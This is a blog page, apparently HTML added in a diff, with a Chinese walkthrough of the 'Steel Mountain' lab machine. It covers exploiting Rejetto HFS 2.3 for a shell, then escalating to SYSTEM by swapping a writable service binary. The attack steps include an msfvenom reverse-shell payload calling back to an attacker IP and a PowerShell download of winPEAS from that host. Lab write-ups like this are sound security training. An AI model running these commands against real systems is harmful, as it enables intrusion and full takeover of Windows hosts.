@@ -1,0 +1,383 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Steel Mountain | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="侵入以机器人先生为主题的 Windows 机器。使用metasploit进行初始访问，利用powershell进行Windows权限升级枚举，并学习一种新技术来获得管理员访问权限。
+
+入侵最佳员工？确定该员工名字为 Bill Harper扫下端口，目标机器是Windows Server，开启如下端口：
+
+80、8080：http
+3389：rdp
+135
+139
+445
+
+尝试后没有ms17
+80端口首页是个静态页面，而8080是个HttpFileServerlogin 登录需要密码
+注意到 HFS 版本为 rejetto 2.3，有历史CVE，可以直接RCE使用msf拿到shell（用searchsploit提供的49584.py也行，但肯定没有meterpreter方便）
+先确定一些基本信息该计算机用户是steelmountain\bill
+提权（修改服务路径）在常规的密码搜集无果后，看看有没有什么可用服务"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Steel Mountain"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Steel Mountain</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>侵入以机器人先生为主题的 Windows 机器。使用metasploit进行初始访问，利用powershell进行Windows权限升级枚举，并学习一种新技术来获得管理员访问权限。</p>
+</blockquote>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>最佳员工？确定该员工名字为 Bill Harper<br><img src="/Red_FILE/5ecf1efebac7f0c7020d7cb274cd7d2f_MD5.jpeg"><br>扫下端口，目标机器是Windows Server，开启如下端口：</p>
+<ul>
+<li>80、8080：http</li>
+<li>3389：rdp</li>
+<li>135</li>
+<li>139</li>
+<li>445</li>
+</ul>
+<p>尝试后没有ms17</p>
+<p>80端口首页是个静态页面，而8080是个HttpFileServer<br><img src="/Red_FILE/e546830f2bf6ff321f83bbeafb1eb693_MD5.jpeg"><br>login 登录需要密码</p>
+<p>注意到 HFS 版本为 rejetto 2.3，有历史CVE，可以直接RCE<br><img src="/Red_FILE/8813e2ac62ce698796fea7806608a481_MD5.jpeg"><br>使用msf拿到shell（用searchsploit提供的49584.py也行，但肯定没有meterpreter方便）<br><img src="/Red_FILE/8b6129513f47806d99796bd4acc34636_MD5.jpeg"></p>
+<p>先确定一些基本信息<br><img src="/Red_FILE/6e900810e5ef2f68a42045b3ac04ccb4_MD5.jpeg"><br>该计算机用户是<code>steelmountain\bill</code></p>
+<h1 id="提权（修改服务路径）"><a href="#提权（修改服务路径）" class="headerlink" title="提权（修改服务路径）"></a>提权（修改服务路径）</h1><p>在常规的密码搜集无果后，看看有没有什么可用服务</p>
+<p>导入PowerUp.ps1，一个服务进入视野：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : &#123;WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...&#125;
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+Name                            : AdvancedSystemCareService9
+Check                           : Modifiable Service Files  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该可执行文件位于<code>C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</code>，服务启动用户是SYSTEM，可修改者正是bill，并允许我们重新启动系统上的服务</p>
+<p>将其替换为我们的木马文件，便能以SYSTEM权限反弹shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.11</span>.84.153 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4443</span> <span class="token parameter variable">-f</span> exe-service <span class="token parameter variable">-o</span> ASCService.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> shell 
+C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>bill<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Startup<span class="token operator">></span> sc stop AdvancedSystemCareService9
+meterpreter <span class="token operator">></span> upload ASCService.exe <span class="token string">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span>
+
+meterpreter <span class="token operator">></span> shell 
+C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>bill<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Startup<span class="token operator">></span> sc start AdvancedSystemCareService9
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/Red_FILE/b5c5d470ac35cc0b0589a84f727c13df_MD5.jpeg"></p>
+<h1 id="提权（利用无引号匹配）"><a href="#提权（利用无引号匹配）" class="headerlink" title="提权（利用无引号匹配）"></a>提权（利用无引号匹配）</h1><p>searchsploit反弹shell（49584.py，改下ip和端口）<br><img src="/Red_FILE/f44343ee3ac32fb179edf2991bfce62d_MD5.jpeg"><br>powershell -c 上传winPEAS</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; powershell -c &quot;wget http:&#x2F;&#x2F;10.11.84.153:8080&#x2F;winPEASany.exe&quot; -outfile &quot;winPEASany.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>执行并下载输出</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; .\winPEASany.exe &gt; peas.txt
+PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>剩下的操作同理</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/06/29/Steel%20Mountain/" class="leancloud-visitors view" data-flag-title="Steel Mountain">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/06/24/CISCN2024华中赛区选拔赛/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-06-29 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>6</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/渗透打靶/">渗透打靶<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%A5%E4%BE%B5"><span class="toc-article-text">入侵</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%8F%90%E6%9D%83%EF%BC%88%E4%BF%AE%E6%94%B9%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%EF%BC%89"><span class="toc-article-text">提权（修改服务路径）</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%8F%90%E6%9D%83%EF%BC%88%E5%88%A9%E7%94%A8%E6%97%A0%E5%BC%95%E5%8F%B7%E5%8C%B9%E9%85%8D%EF%BC%89"><span class="toc-article-text">提权（利用无引号匹配）</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
